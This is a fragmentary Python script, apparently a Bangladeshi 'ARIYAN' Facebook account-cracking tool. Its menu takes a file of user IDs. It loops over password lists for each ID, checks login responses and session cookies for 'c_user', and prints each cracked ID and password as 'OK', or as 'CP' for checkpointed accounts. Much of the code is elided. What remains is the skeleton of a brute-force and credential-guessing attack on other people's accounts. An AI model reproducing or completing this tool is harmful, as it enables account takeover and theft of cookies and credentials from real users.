...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> ARN/BD TEAM  VERSION :\x1b[1;92m 1.2 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/ARIYAN .txt')
				linex()
...
def mmm(ids,names,passlist):
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in ARIYAN :
				print('\r\r\033[1;31m[ARIYAN -CP] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[ARIYAN -OK] '+ids+' | '+pas+'\033[1;97m')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[ARIYAN -CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[ARIYAN -OK] '+cid+' | '+ps+'\33[0;97m')
